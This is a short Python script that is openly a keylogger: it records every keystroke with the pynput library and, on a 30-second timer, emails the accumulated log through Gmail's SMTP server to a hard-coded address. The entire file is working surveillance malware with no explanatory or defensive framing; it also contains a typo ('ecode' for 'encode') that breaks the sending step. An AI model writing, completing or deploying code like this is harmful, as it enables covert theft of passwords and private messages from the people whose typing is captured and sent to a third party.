import pynput.keyboard
import smtplib
import time
import threading

log = ""


def callback_function(key):
    global log
    try:
        log = log + str(key.char)
    except AttributeError:
        if key == key.space:
            log = log + " "
        else:
            log = log + str(key)

    print(log)


def send_email(email, password, message):
    email_server = smtplib.SMTP("smtp.gmail.com", 587)
    email_server.starttls()
    email_server.login(email, password)
    email_server.sendmail(email, email, message)
    email_server.quit()


def thread_function():
    # thread function
    global log
    send_email("targetMail@gmail.com", "testtest1234@gmail.com", log.ecode('utf-8'))
    log = ""
    timer_obj = threading.Timer(30, thread_function)
    timer_obj.start()


keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)

# threading
with keylogger_listener:
    thread_function()
    keylogger_listener.join()


